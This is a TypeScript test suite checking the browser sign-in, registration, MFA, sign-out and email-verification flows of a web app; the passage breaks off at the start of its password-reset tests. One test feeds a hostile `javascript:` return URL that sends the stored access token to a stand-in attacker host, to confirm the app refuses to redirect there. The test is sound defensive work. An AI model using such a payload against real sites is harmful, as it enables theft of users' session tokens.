/**
 * The browser journeys of `docs/ecosystem/22-browser-journeys.md`, tiers 1 and 2, for this surface.
 *
 * Doc 22 §2.2 puts T1 and T2 in the frontend repository and T3 in `micro-beacon`. §4 says what
 * each tier may assume is running: T1 assumes nothing but a browser and stubbed responses, T2
 * assumes this bundle and one API. Nothing below assumes anything else.
 *
 * ══════════════════════════════════════════════════════════════════════════════════════════════
 * THE ONE RULE. Doc 22 §3: **a browser scenario may never assert a business rule.**
 *
 * The reason is an incident (14 §11): a game client withheld four SKUs from its UI while the
 * payment routes stayed live and chargeable, and a client-side test of the hidden catalogue would
 * have passed, green, against the defect — because hiding them WAS the entire control.
 *
 * So every scenario below asserts one of exactly three things (§3.1): what a human can see
 * relative to what the API returned in the SAME run, what the client SENT, or where the browser
 * ended up. Where an outcome depends on a rule the server enforces, `test/journeys.ts` carries an
 * `ownedBy` path to the server-side test that owns it, and the meta-test at the bottom of this
 * file fails the suite if one is missing.
 *
 * The corollary this file obeys: several scenarios end in a refusal. In every case the assertion
 * is on the SENTENCE THE USER IS SHOWN, never on the refusal itself. No password rule, no address
 * format, no limit and no amount policy is asserted anywhere below.
 * ══════════════════════════════════════════════════════════════════════════════════════════════
 *
 * ── TWO SHAPES OF SELF-REFERENTIAL ASSERTION ARE BANNED HERE BY NAME ──────────────────────────
 *
 * Both have already been shipped in this estate and both went green against broken code.
 *
 * 1. **A URL compared with a copy of itself.** `ui/packages/ui/src/index.tsx`: the test
 *    guarding the SSO callback asserted `fetched.url === '…/auth/exchange'`, reading the URL out
 *    of the implementation and comparing it to itself, "so it passed for any value" — while
 *    identity had never served that route. Nothing below reads an address off the code under test.
 *    Where a route matters, the scenario supplies a stub table containing ONLY the routes identity
 *    serves, transcribed as literals; `test/dom.ts` throws on any unrouted request, so a request
 *    to a fourth address fails the scenario outright rather than being answered.
 *
 * 2. **A page compared against the constant it rendered from.** Every figure asserted below is
 *    read out of the fixture the scenario itself supplied and compared with what appeared on the
 *    page — two observations of one value, in opposite directions. No scenario imports a display
 *    constant from `src/` and asserts the page equals it.
 *
 * Each `it` is named with its catalogue id. `SCENARIOS` in `test/journeys.ts` is the catalogue,
 * the blocked ones carry their blocker, and the last describe block asserts the two agree.
 */
import assert from 'node:assert/strict'
import { existsSync, readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { describe, it } from 'node:test'
import { StrictMode, createElement as h, type ReactElement } from 'react'
import { MemoryRouter } from 'react-router-dom'
import { IDENTITY_AUTH_ROUTES } from '@cloudsforge/ui'

import { withScreen, type Routes, type Screen } from './dom.ts'
import * as fx from './fixtures.ts'
import { DOC22_UNCLAIMED, SCENARIOS } from './journeys.ts'
import { __resetAuth } from '../src/lib/api.ts'
import { SendPanel } from '../src/components/send.tsx'
import { ReceivePanel } from '../src/components/receive.tsx'
import { KeyExportPanel } from '../src/components/keyexport.tsx'
import { AuthProvider } from '../src/lib/auth.tsx'
import { AppShell } from '../src/components/shell.tsx'
import {
  ForgotPasswordPage,
  RegisterPage,
  ResetPasswordPage,
  SignInPage,
  SignOutPage,
  VerifyEmailPage,
} from '../src/pages/account.tsx'
import { WalletPage } from '../src/pages/wallet.tsx'

const ORIGIN = 'https://hub.cloudsforge.online'
const at = (p: string) => fileURLToPath(new URL(`../${p}`, import.meta.url))

/**
 * The three routes `micro-identity` serves for a credential exchange, written out as LITERALS.
 *
 * Transcribed from `src/lib/identity.ts`, which carries the `identity/src/server.ts` line
 * each was verified against. They are literals rather than an import so that this file and the
 * implementation have one string to disagree about instead of zero — see the header, hazard 1.
 * `IDENTITY_AUTH_ROUTES` from the design system is cross-checked against them in BJ-SIGNIN-02,
 * which is a comparison of two independent transcriptions and not of a value with itself.
 */
const IDENTITY_ROUTES = {
  login: '/auth/login',
  register: '/auth/register',
  mfa: '/auth/mfa',
  logout: '/auth/logout',
  handoff: '/auth/handoff',
  handoffRedeem: '/auth/handoff/redeem',
} as const

/** A page under a router at `path`. No page in this file reads the session context. */
const page = (element: ReactElement, path: string): ReactElement =>
  h(MemoryRouter, { initialEntries: [path] }, element)

/**
 * Module state that outlives a mount, reset before each scenario.
 *
 * `lib/api.ts` holds an in-flight refresh promise and a memory storage fallback at module scope.
 * A scenario that inherited either would be reading the previous scenario's session, and the
 * failure would look like a flake rather than like leakage.
 */
const fresh = (): void => __resetAuth()

/** The two shared token keys, for a scenario that starts signed in. `lib/api.ts`. */
const SIGNED_IN = { 'cf.accessToken': 'held-access-token', 'cf.refreshToken': 'held-refresh-token' }

/* ══════════════════════════════════════════════════════════════════════════════════════════════
   6.1 Group A — the sign-in surface. Every row was ⛔ on doc 22 §8.1.
   ══════════════════════════════════════════════════════════════════════════════════════════ */

describe('BJ-ACC / BJ-SIGNIN — the estate’s sign-in surface', () => {
  it('BJ-ACC-01 ★ T1: register submits what was typed, and the browser ends on the return address', async () => {
    fresh()
    // The scenario's own inputs. Every assertion below compares against THESE, never against
    // something read back off the page or off the code under test.
    const typed = { email: 'newcomer@example.com', handle: 'newcomer', password: 'a-long-passphrase' }
    const returnTo = `${ORIGIN}/portfolio?tab=holdings`

    await withScreen(
      page(h(RegisterPage), `/account/register?return=${encodeURIComponent(returnTo)}`),
      {
        url: `${ORIGIN}/account/register`,
        routes: { [`POST ${IDENTITY_ROUTES.register}`]: { status: 201, body: fx.session() } },
      },
      async (s) => {
        await s.type(s.byRole('textbox', 'Email'), typed.email)
        await s.type(s.byRole('textbox', 'Handle'), typed.handle)
        await s.type(labelled(s, 'Password'), typed.password)
        await s.type(labelled(s, 'Confirm password'), typed.password)
        await s.click(s.byRole('button', 'Create account'))

        // What the client SENT (doc 22 §3.1), against the scenario's inputs.
        const sent = s.api.matching(`POST ${IDENTITY_ROUTES.register}`)
        assert.equal(sent.length, 1, 'registration was not attempted exactly once')
        assert.deepEqual(sent[0]?.json, typed, 'the body is not the three fields that were typed')

        // Where the browser ENDED UP. `returnTo` is same-origin, so this is an in-app address and
        // no hand-off code is minted for it — minting one would put a credential in the history.
        assert.deepEqual(
          s.navigations,
          [returnTo],
          'a completed registration must land on the address it was asked to return to',
        )
        assert.equal(
          s.api.matching(`POST ${IDENTITY_ROUTES.handoff}`).length,
          0,
          'a same-origin return minted a hand-off code, putting a credential in the address bar',
        )
        s.clean('registration')
      },
    )
  })

  it('BJ-ACC-02 T1: a refused handle carries the server’s sentence and clears no other field', async () => {
    fresh()
    const typed = { email: 'taken@example.com', handle: 'alice', password: 'a-long-passphrase' }
    // The sentence is the SERVER'S. This bundle holds no handle rule and asserts none.
    const serverSentence = 'That handle is already in use. Choose another.'

    await withScreen(
      page(h(RegisterPage), '/account/register'),
      {
        url: `${ORIGIN}/account/register`,
        routes: {
          [`POST ${IDENTITY_ROUTES.register}`]: {
            status: 409,
            body: fx.errorBody('handle_taken', 'That registration was refused.', [
              { field: 'handle', code: 'taken', message: serverSentence },
            ]),
          },
        },
      },
      async (s) => {
        await s.type(s.byRole('textbox', 'Email'), typed.email)
        await s.type(s.byRole('textbox', 'Handle'), typed.handle)
        await s.type(labelled(s, 'Password'), typed.password)
        await s.type(labelled(s, 'Confirm password'), typed.password)
        await s.click(s.byRole('button', 'Create account'))

        // Presentation, relative to what the API returned IN THIS SAME RUN.
        assert.ok(s.text().includes(serverSentence), 'the server’s sentence is not on the page')
        const invalid = s.document.querySelector('[aria-invalid="true"]')
        assert.equal(invalid?.getAttribute('id'), 'handle', 'the wrong field is marked invalid')

        // 05:91 — form state survives a rejected submit. This is the whole scenario: a form that
        // clears makes the user retype an address and a password they had right, to fix one word.
        assert.equal(valueOf(s, 'email'), typed.email, 'the email was cleared by a refusal')
        assert.equal(valueOf(s, 'handle'), typed.handle, 'the handle was cleared by a refusal')
        assert.equal(valueOf(s, 'new-password'), typed.password, 'the password was cleared')
        assert.equal(s.navigations.length, 0, 'a refused registration navigated somewhere')
      },
    )
  })

  it('BJ-ACC-03 ★ T1: the deep link survives the round trip — sign-in lands on /portfolio, not /', async () => {
    fresh()
    const returnTo = `${ORIGIN}/portfolio`

    await withScreen(
      page(h(SignInPage), `/account/login?return=${encodeURIComponent(returnTo)}`),
      {
        url: `${ORIGIN}/account/login`,
        routes: { [`POST ${IDENTITY_ROUTES.login}`]: { body: fx.session() } },
      },
      async (s) => {
        await s.type(s.byRole('textbox', 'Email or handle'), 'alice@example.com')
        await s.type(labelled(s, 'Password'), 'a-long-passphrase')
        await s.click(s.byRole('button', 'Sign in'))

        // THE ASSERTION THIS SCENARIO EXISTS FOR. `returnTo` is built above from the scenario's
        // own constants; nothing here reads an address off the page or off `src/`.
        assert.deepEqual(s.navigations, [returnTo], 'the return address did not survive sign-in')
        // And specifically not the dashboard, which is the failure the row names.
        assert.notEqual(s.navigations[0], `${ORIGIN}/`, 'sign-in dropped the deep link for /')
        s.clean('sign-in')
      },
    )
  })

  it('BJ-ACC-04 ★ T1: a session already held is handed over with no second prompt, and one code is minted', async () => {
    fresh()
    const elsewhere = 'https://worlds.cloudsforge.online/player'
    const code = 'handoff-code-9f3a'
    let minted = 0

    await withScreen(
      // UNDER StrictMode, which is the whole point of the ref this scenario guards: React mounts
      // every effect TWICE in development, and `main.tsx` renders the app inside <StrictMode>. A
      // scenario mounted without it cannot tell a ref-guarded effect from an unguarded one — the
      // effect runs once either way — and a mutation removing the guard survived until this was
      // added. It is `pages/account.tsx`'s own stated reason, exercised.
      h(StrictMode, null, page(h(SignInPage), `/account/login?return=${encodeURIComponent(elsewhere)}`)),
      {
        url: `${ORIGIN}/account/login`,
        storage: SIGNED_IN,
        routes: {
          [`POST ${IDENTITY_ROUTES.handoff}`]: () => {
            minted += 1
            return { body: { code, expiresInSeconds: 60 } }
          },
        },
      },
      async (s) => {
        await s.settle()

        // NO SECOND CREDENTIAL PROMPT. Asserted as the absence of the controls, which is a
        // presentation fact about this page and not a security claim: doc 22 §3 and
        // `src/app.tsx` both record that hiding is never the boundary.
        assert.equal(s.queryByRole('button', 'Sign in'), null, 'a held session was asked for a password')
        assert.equal(s.queryByRole('textbox', 'Email or handle'), null, 'the identifier field was offered')
        assert.match(s.text(), /Signing you in|Taking you back/i, 'the hand-off was not announced')

        // Exactly one code. The effect is guarded by a ref rather than by a dependency list
        // precisely because StrictMode mounts every effect twice and a second run would spend a
        // second hand-off code (`pages/account.tsx`).
        assert.equal(minted, 1, `the hand-off code was minted ${minted} times, not once`)

        // The code travels in the FRAGMENT of the return address, never in the query string.
        assert.equal(s.navigations.length, 1, 'the hand-off did not navigate exactly once')
        const went = new URL(s.navigations[0] as string)
        assert.equal(went.origin + went.pathname, elsewhere, 'the hand-off went to the wrong place')
        assert.equal(went.searchParams.get('cf_code'), null, 'the code was put in the query string')
        assert.equal(
          new URLSearchParams(went.hash.slice(1)).get('cf_code'),
          code,
          'the fragment does not carry the code identity minted in this run',
        )

        // The token was presented to mint it, and the origin asked for is an ORIGIN, not a URL.
        const mint = s.api.matching(`POST ${IDENTITY_ROUTES.handoff}`)[0]
        assert.equal(mint?.headers['authorization'], `Bearer ${SIGNED_IN['cf.accessToken']}`)
        assert.deepEqual(mint?.json, { redirectOrigin: new URL(elsewhere).origin })
      },
    )
  })

  it('BJ-SIGNIN-01 T1: a wrong MFA code returns to the password step rather than re-offering a spent challenge', async () => {
    fresh()
    const challenge = 'challenge-abc123'
    const serverSentence = 'That code was not accepted. Sign in again to get a new one.'

    await withScreen(
      page(h(SignInPage), '/account/login'),
      {
        url: `${ORIGIN}/account/login`,
        routes: {
          [`POST ${IDENTITY_ROUTES.login}`]: { body: fx.mfaRequired({ challenge }) },
          [`POST ${IDENTITY_ROUTES.mfa}`]: {
            status: 401,
            body: fx.errorBody('mfa_failed', serverSentence),
          },
        },
      },
      async (s) => {
        await s.type(s.byRole('textbox', 'Email or handle'), 'alice@example.com')
        await s.type(labelled(s, 'Password'), 'a-long-passphrase')
        await s.click(s.byRole('button', 'Sign in'))

        // A password accepted and NOTHING ELSE established: no session was stored.
        assert.match(s.text(), /One more step|code from your/i, 'the challenge step did not render')
        assert.equal(s.window.localStorage.getItem('cf.accessToken'), null, 'a challenge minted a session')

        await s.type(s.byRole('textbox', 'Code'), '000000')
        await s.click(s.byRole('button', 'Continue'))

        // identity spends the challenge whether or not the code was right, so there is nothing to
        // retry here. The page says so by going back rather than by leaving a dead form up.
        assert.ok(s.text().includes(serverSentence), 'the server’s sentence is not on the page')
        assert.ok(s.queryByRole('button', 'Sign in') !== null, 'the password step was not restored')
        assert.equal(s.queryByRole('textbox', 'Code'), null, 'the spent challenge is still on offer')

        // The challenge was answered exactly once. A second attempt against a spent challenge is
        // the unlimited offline-speed oracle the server-side design exists to close.
        const answered = s.api.matching(`POST ${IDENTITY_ROUTES.mfa}`)
        assert.equal(answered.length, 1)
        assert.deepEqual(answered[0]?.json, { challenge, code: '000000' })
      },
    )
  })

  it('BJ-SIGNIN-02 ★ T1: every credential request goes to a route identity serves, and nowhere else', async () => {
    fresh()
    // The stand-in serves ONLY the routes identity serves. `test/dom.ts` throws on anything else,
    // so a POST to `/auth/exchange` — the address every SSO callback in this estate used to go to,
    // and which identity has never served — fails this scenario instead of being answered.
    const served: Routes = {
      [`POST ${IDENTITY_ROUTES.login}`]: { body: fx.mfaRequired() },
      [`POST ${IDENTITY_ROUTES.mfa}`]: { body: fx.session() },
    }

    await withScreen(
      page(h(SignInPage), '/account/login'),
      { url: `${ORIGIN}/account/login`, routes: served },
      async (s) => {
        await s.type(s.byRole('textbox', 'Email or handle'), 'alice@example.com')
        await s.type(labelled(s, 'Password'), 'a-long-passphrase')
        await s.click(s.byRole('button', 'Sign in'))
        await s.type(s.byRole('textbox', 'Code'), '123456')
        await s.click(s.byRole('button', 'Continue'))

        // The set of addresses this surface used, as observed — compared against the literals at
        // the top of this file, which were transcribed from identity's route table independently
        // of the implementation.
        assert.deepEqual(
          s.api.wire.map((w) => w.path),
          [IDENTITY_ROUTES.login, IDENTITY_ROUTES.mfa],
          'the sign-in surface called an address that is not in identity’s route table',
        )
        // Every one of them went to nimbus and not to this app's own origin: identity is
        // cross-origin from every surface, always (`lib/api.ts`).
        for (const call of s.api.wire) {
          assert.notEqual(call.origin, ORIGIN, `${call.path} was posted same-origin, to hub-api`)
          assert.match(call.origin, /^https:\/\/nimbus\./, `${call.path} did not go to identity`)
        }

        // The design system's copy of the two hand-off routes agrees with this file's. Two
        // independent transcriptions of one route table, not a value compared with itself.
        assert.equal(IDENTITY_AUTH_ROUTES.handoff, IDENTITY_ROUTES.handoff)
        assert.equal(IDENTITY_AUTH_ROUTES.handoffRedeem, IDENTITY_ROUTES.handoffRedeem)
        assert.ok(
          !Object.values(IDENTITY_AUTH_ROUTES).includes('/auth/exchange' as never),
          'the design system is still pointing at the route identity has never served',
        )
      },
    )
  })

  it('BJ-SIGNIN-03 T1: sign-out clears the local tokens even when revocation fails, and leaves anyway', async () => {
    fresh()
    const returnTo = 'https://market.cloudsforge.online/'

    await withScreen(
      page(h(SignOutPage), `/account/logout?return=${encodeURIComponent(returnTo)}`),
      {
        url: `${ORIGIN}/account/logout`,
        storage: SIGNED_IN,
        // The revocation is a network call and may fail; the clearing cannot.
        routes: { [`POST ${IDENTITY_ROUTES.logout}`]: { networkError: 'Failed to fetch' } },
        // This screen is thirty-four characters long, on purpose — see `MountOptions.mountedText`.
        mountedText: 'Ending your session',
      },
      async (s) => {
        await s.settle()
        assert.equal(s.window.localStorage.getItem('cf.accessToken'), null, 'the access token survived sign-out')
        assert.equal(s.window.localStorage.getItem('cf.refreshToken'), null, 'the refresh token survived sign-out')
        assert.deepEqual(s.navigations, [returnTo], 'a failed revocation stranded the user')
        // The token that was held is the token that was presented for revocation.
        assert.deepEqual(s.api.matching(`POST ${IDENTITY_ROUTES.logout}`)[0]?.json, {
          refreshToken: SIGNED_IN['cf.refreshToken'],
        })
      },
    )
  })

  it('BJ-SIGNIN-04 ★ T1: a non-http ?return= never reaches location.assign', async () => {
    fresh()
    // `?return=` is a query parameter on a public page, so it is attacker-controllable.
    // `new URL('javascript:…')` parses happily and yields an origin of `null`.
    const hostile = 'javascript:fetch("https://evil.example/"+localStorage.getItem("cf.accessToken"))'

    await withScreen(
      page(h(SignInPage), `/account/login?return=${encodeURIComponent(hostile)}`),
      {
        url: `${ORIGIN}/account/login`,
        routes: { [`POST ${IDENTITY_ROUTES.login}`]: { body: fx.session() } },
      },
      async (s) => {
        await s.type(s.byRole('textbox', 'Email or handle'), 'alice@example.com')
        await s.type(labelled(s, 'Password'), 'a-long-passphrase')
        await s.click(s.byRole('button', 'Sign in'))

        assert.deepEqual(s.navigations, [`${ORIGIN}/`], 'the fall-back is not the dashboard')
        for (const went of s.navigations) {
          assert.ok(/^https?:/.test(went), `the browser was sent to ${went}`)
        }
        // And no hand-off code was minted for it either — the guard is upstream of the redirect.
        assert.equal(s.api.matching(`POST ${IDENTITY_ROUTES.handoff}`).length, 0)
      },
    )
  })

  it('BJ-SIGNIN-05 T1: an origin identity will not mint for is said out loud, not bounced away', async () => {
    fresh()
    const notAllowed = 'https://someone-elses-app.example.com/callback'

    await withScreen(
      page(h(SignInPage), `/account/login?return=${encodeURIComponent(notAllowed)}`),
      {
        url: `${ORIGIN}/account/login`,
        routes: {
          [`POST ${IDENTITY_ROUTES.login}`]: { body: fx.session() },
          // identity refuses to MINT for an origin off its allowlist. That refusal is the only
          // open-redirect guard that counts, and this app deliberately holds no second list.
          [`POST ${IDENTITY_ROUTES.handoff}`]: {
            status: 403,
            body: fx.errorBody('handoff_origin_not_allowed', 'That origin may not receive a session.'),
          },
        },
      },
      async (s) => {
        await s.type(s.byRole('textbox', 'Email or handle'), 'alice@example.com')
        await s.type(labelled(s, 'Password'), 'a-long-passphrase')
        await s.click(s.byRole('button', 'Sign in'))

        // Said out loud. A silent bounce to the dashboard would hide a misconfiguration and make
        // the surface the user came from look broken.
        assert.equal(s.navigations.length, 0, 'a refused hand-off navigated anyway')
        assert.ok(
          s.text().includes(new URL(notAllowed).origin),
          'the refusal does not name the origin that was refused',
        )
        assert.ok(s.allByRole('alert').length > 0, 'the refusal is not announced')
        // And the user is not stranded: the password form is back, so they can sign in here.
        assert.ok(s.queryByRole('button', 'Sign in') !== null)
      },
    )
  })

  /* ── The two the owner found by hand on the live estate, 2026-08-05 ──────────────────────── */

  it('BJ-SIGNIN-06 ★ T1: two passwords that disagree are not posted, and the second field says why', async () => {
    fresh()
    // The scenario's own inputs. The two differ by ONE character in the middle, which is the slip
    // this field exists to catch — a trailing difference is the one people notice unaided.
    const typed = { email: 'newcomer@example.com', handle: 'newcomer', password: 'a-long-passphrase' }
    const slip = 'a-long-pASsphrase'
    assert.notEqual(typed.password, slip, 'the scenario’s two values are the same; it asserts nothing')

    await withScreen(
      page(h(RegisterPage), '/account/register'),
      {
        url: `${ORIGIN}/account/register`,
        // A route that WOULD succeed. The scenario is that it is never called: stubbing a failure
        // here would let a bundle that posted the mismatch pass by rendering the failure.
        routes: { [`POST ${IDENTITY_ROUTES.register}`]: { status: 201, body: fx.session() } },
      },
      async (s) => {
        await s.type(s.byRole('textbox', 'Email'), typed.email)
        await s.type(s.byRole('textbox', 'Handle'), typed.handle)
        await s.type(labelled(s, 'Password'), typed.password)
        await s.type(labelled(s, 'Confirm password'), slip)
        await s.click(s.byRole('button', 'Create account'))

        // THE ASSERTION THAT IS TRUE ONLY WHEN IT WORKS. A registration that reaches identity has
        // already created the account with whichever of the two the code happened to send, and the
        // user is signed in holding a credential they did not choose.
        assert.equal(
          s.api.matching(`POST ${IDENTITY_ROUTES.register}`).length,
          0,
          'a registration with two different passwords was posted to identity',
        )
        assert.equal(s.navigations.length, 0, 'a mismatched registration navigated somewhere')

        // Said where the mistake is, on the field that is wrong. Marking the first field invalid
        // would send the user to correct the value they meant.
        const invalid = s.document.querySelector('[aria-invalid="true"]')
        assert.equal(invalid?.getAttribute('id'), 'confirm-password', 'the wrong field is marked')

        // 05:91 again — nothing is cleared, including the two passwords. Clearing them makes the
        // user retype both to fix one keystroke, which is how a mismatch becomes two mismatches.
        assert.equal(valueOf(s, 'email'), typed.email, 'the email was cleared')
        assert.equal(valueOf(s, 'handle'), typed.handle, 'the handle was cleared')
        assert.equal(valueOf(s, 'new-password'), typed.password, 'the password was cleared')
        assert.equal(valueOf(s, 'confirm-password'), slip, 'the confirmation was cleared')

        // And it is a gate, not a wall: correcting the second field and pressing again goes
        // through, with the FIRST field's value — never the one that was typed second.
        await s.type(labelled(s, 'Confirm password'), typed.password)
        await s.click(s.byRole('button', 'Create account'))
        const sent = s.api.matching(`POST ${IDENTITY_ROUTES.register}`)
        assert.equal(sent.length, 1, 'a corrected registration was not posted exactly once')
        assert.deepEqual(
          sent[0]?.json,
          typed,
          'the body is not the three fields identity takes — the confirmation must not be sent, ' +
            'and the password sent must be the one from the first field',
        )
      },
    )
  })

  it('BJ-SIGNIN-07 ★ T1: a held session shows the account in the bar at first paint, not after a reload', async () => {
    fresh()
    // The scenario's own inputs: the handle inside the token, and a DIFFERENT one from identity,
    // so that "the bar shows a handle" cannot be satisfied by whichever source happened to answer.
    const inTheToken = 'savvanis'
    const fromIdentity = 'savvanis-canonical'
    assert.notEqual(inTheToken, fromIdentity, 'the two sources are the same; this asserts nothing')

    await withScreen(
      h(MemoryRouter, { initialEntries: ['/'] }, h(AuthProvider, null, h(AppShell))),
      {
        url: `${ORIGIN}/`,
        storage: {
          'cf.accessToken': unsignedToken({ handle: inTheToken, roles: ['player'] }),
          'cf.refreshToken': 'held-refresh-token',
        },
        routes: {
          // Slow on purpose. The live estate answers this cross-origin, behind a CORS preflight,
          // over the tunnel — 308ms for the preflight alone, measured 2026-08-05 — and the whole
          // defect lives in the window this delay stands in for.
          'GET /auth/me': { delayMs: 200, body: { user: { id: 'u1', handle: fromIdentity, roles: ['player'] } } },
        },
      },
      async (s) => {
        // The identity call is IN FLIGHT and has not answered. If this is ever 0, the delay stopped
        // working and everything below would be asserting the settled state.
        assert.equal(s.api.matching('GET /auth/me').length, 1, '/auth/me was not called at all')

        // ── THE ASSERTION THAT IS TRUE ONLY WHEN IT GENUINELY WORKS ────────────────────────────
        // Not "the bar rendered", not "no console error", not "no failed request" — all of those
        // were true of the defect. A signed-in user must never be offered Sign in.
        // `=== null` INSIDE the assertion, never `assert.equal(element, null)`. node's assert
        // inspects `actual` to build the diff, and a happy-dom element is the whole cyclic
        // document: the failure path takes ninety seconds and abandons every test after it, so
        // the red result never reaches the reporter. A boolean is what is compared here.
        assert.ok(
          s.queryByRole('button', 'Sign in') === null,
          'the bar offers Sign in to a user who is holding a session — this is the defect: a ' +
            'working sign-in that looks broken until something forces a re-render',
        )
        assert.ok(
          s.text().includes(inTheToken),
          `the bar does not carry the account at first paint. It holds ${JSON.stringify(s.text().slice(0, 160))}`,
        )

        // And identity still wins when it answers. The token is what is shown until then; it is
        // not a cache that outlives the truth.
        await s.settle(300)
        assert.ok(s.text().includes(fromIdentity), 'identity’s answer did not replace the token’s')
        assert.ok(s.queryByRole('button', 'Sign in') === null, 'the bar fell back to signed-out')
        s.clean('the bar at first paint')
      },
    )
  })
})

/* ══════════════════════════════════════════════════════════════════════════════════════════════
   Email verification. The owner: "i didn't receive any registration email and i was able to
   login directly." The policy they then chose: the link verifies the address, signs you in, and
   lands you in the product.
   ══════════════════════════════════════════════════════════════════════════════════════════ */

describe('BJ-SIGNIN — proving the address', () => {
  /**
   * A token-shaped string that is not a token.
   *
   * Sixty-four hex characters, because that is what identity mints, and built here from a fixed
   * pattern so no credential — real or plausible — is written into this repository. What is
   * asserted below is that THIS EXACT STRING makes the round trip, so the value has to be the
   * scenario's own input and nothing read back off the code.
   */
  const FAKE_TOKEN = 'deadbeef'.repeat(8)

  it('BJ-SIGNIN-08 ★ T1: the link signs you in, and the token leaves the address bar before it goes on the wire', async () => {
    fresh()
    const landing = `${ORIGIN}/account/verify`
    const returnTo = `${ORIGIN}/portfolio`

    /*
     * THE ADDRESS BAR AS IT WAS AT THE INSTANT THE REQUEST WENT OUT.
     *
     * Recorded from inside the stub, because that is the only place the ordering is observable.
     * The first version of this scenario read `location.hash` after the exchange had settled and
     * asserted it was clean — which is true of a bundle that strips it AFTERWARDS too, so the
     * assertion passed against a deliberate mutant that moved the `replaceState` into the `.then`.
     * A check that cannot fail is worse than no check, and this file has a meta-test about
     * precisely that class of mistake. The URL is sampled when the credential is on the wire.
     */
    let urlWhenSent = '(the request was never made)'

    await withScreen(
      page(h(VerifyEmailPage), `/account/verify?return=${encodeURIComponent(returnTo)}`),
      {
        url: `${landing}?return=${encodeURIComponent(returnTo)}#token=${FAKE_TOKEN}`,
        routes: {
          'POST /auth/email/verify': () => {
            urlWhenSent = globalThis.location.href
            return { body: fx.session() }
          },
        },
        // Thirty-five characters — a spinner, a title and a live region, and by the time it has
        // more to say the browser has left. The same case as SignOutPage's thirty-four, answered
        // the same way: the forty-character heuristic is REPLACED by a named expectation, which is
        // stricter (a blank page fails it too, and so does the wrong screen) rather than lowered.
        mountedText: 'Signing you in',
      },
      async (s) => {
        await s.settle(20)

        // ── It was spent, exactly once, and with the token from the fragment.
        const sent = s.api.matching('POST /auth/email/verify')
        assert.equal(sent.length, 1, 'the link was not redeemed exactly once')
        assert.deepEqual(
          sent[0]?.json,
          { token: FAKE_TOKEN },
          'the body is not the token that was in the fragment, and nothing else',
        )

        // ── THE ORDERING THAT IS THE POINT, ASSERTED WHERE IT IS OBSERVABLE.
        // The token was already out of the address bar when the request left. An "after it
        // resolves" version leaves a live credential in the history for the length of a round
        // trip — in the referrer of anything the page loads next, in any screenshot taken while it
        // is in flight — and never strips it at all when the request throws.
        assert.ok(
          !urlWhenSent.includes(FAKE_TOKEN),
          `the token was still in the address bar when the redemption request went out: ${urlWhenSent}`,
        )
        assert.ok(
          !s.window.location.href.includes(FAKE_TOKEN),
          'the token is still somewhere in the current URL',
        )
        // And it is not in storage either — the session is, the credential that bought it is not.
        assert.ok(!s.storageSnapshot().includes(FAKE_TOKEN), 'the link token was persisted')

        // ── And the reader ends up signed in, on the address they were going to.
        assert.deepEqual(s.navigations, [returnTo], 'a verified link did not land the reader in the product')
        s.clean('verification')
      },
    )
  })

  it('BJ-SIGNIN-09 ★ T1: the address a mail scanner pre-fetches spends nothing', async () => {
    fresh()
    // A pre-fetch is a GET of the path with NO fragment — browsers do not transmit one, which is
    // the entire reason the token lives there. This is that request, modelled exactly.
    await withScreen(
      page(h(VerifyEmailPage), '/account/verify'),
      {
        url: `${ORIGIN}/account/verify`,
        // A route that WOULD succeed, so a bundle that posted something cannot pass by rendering
        // a failure.
        routes: { 'POST /auth/email/verify': { body: fx.session() } },
      },
      async (s) => {
        await s.settle(20)
        assert.equal(
          s.api.matching('POST /auth/email/verify').length,
          0,
          'opening the link without a fragment redeemed something — a mail scanner would then ' +
            'consume the single-use token before the person it was sent to ever clicked it',
        )
        assert.equal(s.navigations.length, 0, 'a pre-fetch navigated somewhere')
        // It says how to get where they were going, rather than reporting a failure that did not
        // happen. The person here is either a scanner, which reads nothing, or someone who copied
        // the address out of a mail client that dropped the fragment.
        assert.ok(s.text().includes('link from your email'), 'the page does not say what is missing')
      },
    )
  })

  it('BJ-SIGNIN-10 ★ T1: registration does not sign you in — it says where the link went', async () => {
    fresh()
    const typed = { email: 'newcomer@example.com', handle: 'newcomer', password: 'a-long-passphrase' }
    const returnTo = `${ORIGIN}/portfolio`

    await withScreen(
      page(h(RegisterPage), `/account/register?return=${encodeURIComponent(returnTo)}`),
      {
        url: `${ORIGIN}/account/register`,
        routes: {
          // identity's 202: the account exists, unverified, and the link is what creates a session.
          [`POST ${IDENTITY_ROUTES.register}`]: {
            status: 202,
            body: { verificationRequired: true, email: typed.email },
          },
        },
      },
      async (s) => {
        await s.type(s.byRole('textbox', 'Email'), typed.email)
        await s.type(s.byRole('textbox', 'Handle'), typed.handle)
        await s.type(labelled(s, 'Password'), typed.password)
        await s.type(labelled(s, 'Confirm password'), typed.password)
        await s.click(s.byRole('button', 'Create account'))
        await s.settle(20)

        // THE ASSERTION THAT IS TRUE ONLY WHEN THE POLICY HOLDS. A bundle that signed the user in
        // here would render a perfectly good "check your email" screen on the way past.
        assert.equal(s.navigations.length, 0, 'registration navigated as though it held a session')
        assert.ok(
          !s.storageSnapshot().includes('cf.accessToken'),
          'registration stored a session for an account whose address is not proved',
        )
        // And it names the address, because a typo in it is the commonest reason mail "never
        // arrives" and a person cannot check a value they can no longer see.
        assert.ok(s.text().includes(typed.email), 'the address the link was sent to is not shown')
        assert.ok(s.queryByRole('status', /link to/) !== null, 'the outcome is not announced')
      },
    )
  })
})

/* ══════════════════════════════════════════════════════════════════════════════════════════════
   The password reset. identity serves both halves — `POST /auth/password/forgot` and
   `POST /auth/password/reset`, both in `identity/src/server.ts` — and
   the mail could not be sent at all until this bundle served a page at `/account/reset`, because
   notify refuses to send a message whose link cannot be built.

   The token in that link is a PASSWORD-EQUIVALENT: it changes the credential and revokes every
   session on the account. So the three scenarios below are about where it is allowed to be, and
   the one route that must answer identically for every address in the world.
   ══════════════════════════════════════════════════════════════════════════════════════════ */

describe('BJ-SIGNIN — the password reset', () => {
  /**
   * A token-shaped string that is not a token, built from a fixed pattern.
   *
   * Sixty-four hex characters, because that is what identity mints. Written here rather than read
   * off the code, so that what the assertions prove is that THIS EXACT STRING made — or did not
   * make — each journey. Deliberately not the constant the verification scenarios use: two
   * scenarios sharing a literal is how a copy-paste in the implementation goes unnoticed.
   */
  const LINK_TOKEN = 'facefeed'.repeat(8)

  /** identity's two password routes, as literals. See the header, hazard 1. */
  const RESET_ROUTES = { forgot: '/auth/password/forgot', reset: '/auth/password/reset' } as const

